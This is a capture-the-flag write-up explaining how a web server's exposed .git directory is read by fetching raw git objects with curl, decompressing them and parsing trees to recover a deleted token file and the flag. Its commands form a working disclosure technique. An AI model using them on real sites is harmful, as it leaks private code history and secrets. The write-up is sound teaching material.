## tumorous ##
Writeup by @cyphar.

> **NOTE**: This write-up has a certain assumed knowledge about git internals
> and how git stores data inside the `.git` directory. A good primer on git
> objects can be found
> [here](http://git-scm.com/book/en/v2/Git-Internals-Git-Objects).

### tl;dr ###
The `.git` directory for the website's repo was exposed, allowing for raw git
objects to be retrieved and files in the git project history to be disclosed.

### Introduction ###
The page linked in the challenge description has some diary-like entries (one
of which mentions git, leading to the conclusion that the website has a git
repository which we can access).

Here are the diary entries, for completeness:

```txt
13/2/2004: I learned how to html, yay!
12/4/2004: I learned how to use git, yay!
13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon.
08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it.
10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh.
10/9/2004: I can't forget my token. What do I do?
11/9/2004: I panicked and deleted the token. It is the work of evil doers.
12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.
```

If you try to visit http://tumorous.9447.plumbing/.git/, you get a 403 error,
implying that there is a `.git` directory, but indexes have been disabled for
the web server. We're going to have to do this the old-fashioned way.

### Tips and Background ###
There are quite a few helpful files inside `.git` which make our job much
easier.

* `.git/HEAD` (teamed with `.git/refs/heads/*`) can tell you the current commit
  hash that `HEAD` points to in the local git repo.
* `.git/logs/HEAD` allows you to see the history of the `HEAD` of a local git
  repo (including commit amendments and rebases, basically this file is where
  `git reflog` gets its data from).

In addition, it is necessary to know how git stores data. Basically git (at its
core), has a hashmap of hashes to objects. Some of these objects are commit
objects (which point to tree objects, which point to blob objects -- files).

Since the "website owner" hasn't purged the commits which contain the required
file, if we can find a commit where the `token` file existed, we can get that
file.

It is also helpful to know two things:

* `gzip` can decompress `zlib` compressed data (by simply adding a dummy header
  to the compressed stream) -- this makes dealing with git commit objects much
  easier. This can be done using the command:
  `(printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; cat zlib.data) | gzip -dc`
* `git cat-file` doesn't do any sanity checks on your local git repo, meaning
  that you can create a new repo, download `.git/object` files and then use
  `git cat-file` to read them without any trouble.

### Exploitation ###

So, we need to look for a git blob object that represents `token`, when it
contained the data we want.

The first step is to establish the commit history of the repo, which can be
done with our good friend `.git/logs/HEAD`:

```console
$ curl http://tumorous.9447.plumbing/.git/logs/HEAD | cat -v
0000000000000000000000000000000000000000 cb36b491e21091a258cb26f56f6157e31084a693 root <root@ip-172-31-5-48.ap-southeast-2.compute.internal> 1412670724 +0000   commit (initial): I'm new to this repo stuff
cb36b491e21091a258cb26f56f6157e31084a693 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a John Doe <fsck@you.me> 1412670748 +0000       commit (amend): I'm new to this repo stuff
043a18366cb0b2ab31c0f9b14a755a8e597a8b6a 3dbda5576912236328494b11f9361dca66c0218a root <root@ip-172-31-5-48.ap-southeast-2.compute.internal> 1417231293 +0000   commit: My token now exists!
```

The commit "3dbda5576912236328494b11f9361dca66c0218a" looks like the best bet
(given the commit message). This hash is the hash of the commit object, which
contains a link to the tree object (and thus to the blob data at that point in
the git history for the repo, thus it contains the contents of the `token`
file).

> **NOTE**: For several reasons (IIRC, the main reason is that filesystems don't
> handle huge numbers of files in a single directory -- due to cache misses and
> hashmap-related issues) git stores its objects in a series of folders under
> `.git/objects`, where the object's hash is split such that the first two
> characters are the directory under `.git/objects` and the rest of the hash is
> the filename.

```console
$ (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; curl http://tumorous.9447.plumbing/.git/objects/3d/bda5576912236328494b11f9361dca66c0218a) | gzip -dc | cat -v

gzip: stdin: unexpected end of file
commit 285^@tree 97d2ea0a2433ecc3024674b1d1ab18661c99b0fe
parent 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a
author root <root@ip-172-31-5-48.ap-southeast-2.compute.internal> 1417231293 +0000
committer root <root@ip-172-31-5-48.ap-southeast-2.compute.internal> 1417231293 +0000

My token now exists!
```

So the tree object for that commit (ignoring the erroneous `gzip` errors) is
"97d2ea0a2433ecc3024674b1d1ab18661c99b0fe". So let's try doing the same trick to
that object.

```console
$ (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; curl http://tumorous.9447.plumbing/.git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe) | gzip -dc | cat -v

gzip: stdin: unexpected end of file
tree 71^@100644 index.html^@;M-:`M-oHWM-^M^F^YM-/M-pgM-GM-vYl^T&M-NM-^V100644 token^@^M/M-NF#M-*M-^LM-XM-|M-*M-iiM-IM-/LsM-`M-4M-?M-``
```

Disaster! You can see that the object refers to the elusive `token` file, but
we can't extract the hashes as easily as we did before. Turns out, git stores
the hashes of the blob objects pointed to by a tree objects in a binary format.
So we're going to have to either:

1. Download the object, then manually work through the object's data with a hex
   editor (or just `hexdump -C`) to figure out the hexadecimal representation of
   the hashes; or
2. Download the object into a git repo and then use the specifically designed
   `git cat-file` to extract the information.

Since 1 would be a major PITA, we went with 2. So you just need to make a new
repo, drop in the object data and then use `git` to parse the file for you.

```console
$ cd $(mktemp -d)
$ git init
Initialized empty Git repository in [temporary directory]
$ curl -o .git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe http://tumorous.9447.plumbing/.git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe
# [... snip ...]
$ git cat-file -t
$ git cat-file -t 97d2ea0a2433ecc3024674b1d1ab18661c99b0fe
tree
$ git cat-file -p 97d2ea0a2433ecc3024674b1d1ab18661c99b0fe
100644 blob 3bba60ef48578d0619aff067c7f6596c1426ce96    index.html
100644 blob 0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0    token
```

Okay, so now we know the hash of the blob object that represents the contents
of `token` at that point in the git repo's history --
"0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0". So now all we need to do is read
that file and we're done.

```console
$ (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; curl http://tumorous.9447.plumbing/.git/objects/0d/2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0) | gzip -dc | cat -v

gzip: stdin: unexpected end of file
blob 35^@9447{IM_SITTING_ON_A_PILE_OF_GOLD}
```

Boom! So the flag is `9447{IM_SITTING_ON_A_PILE_OF_GOLD}`.

### Notes ###
* You couldn't clone the repo over http (or at least, we couldn't -- some other
  teams managed to), hence all of this dark magic was necessary.
* @cyphar remembered how horrible git's source code is while trying to reverse
  engineer `git cat-file`, so that we didn't have to download the objects and
  defile an innocent git repo (he failed and got PTSD from it).
* You should switch to mercurial if you intend to hack on your version control
  system, while retaining your sanity and faith in humanity.

### Mitigations ###
If you don't want people to read the history of your git repo, don't make it
publically accessible. And no, turning indexes off doesn't make any difference
whatsover (AFAIK git doesn't internally use any filesystem traversal magic,
it only uses links and references to data to build and store graphs).
